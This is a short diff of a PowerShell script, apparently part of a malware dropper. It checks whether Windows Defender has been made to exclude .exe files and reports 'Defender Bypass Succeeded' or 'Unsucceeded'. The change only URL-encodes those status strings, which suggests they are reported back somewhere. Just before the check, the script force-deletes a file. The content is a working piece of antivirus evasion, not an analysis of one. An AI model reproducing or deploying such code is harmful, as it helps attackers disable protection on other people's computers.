@@ -8,10 +8,10 @@ Remove-Item -Path $filename -Force;
 $valueExists = (Get-Item 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions\' -EA Ignore).Property -contains '.exe';
 function Check{
     if($valueExists -eq $true){
-        return "%E2%9C%94 Defender Bypass Succeeded";
+        return "%E2%9C%94%20Defender%20Bypass%20Succeeded";
     }
     else{
-        return "%E2%9D%8C Defender Bypass Unsucceeded";
+        return "%E2%9D%8C%20Defender%20Bypass%20Unsucceeded";
     }
 }
 
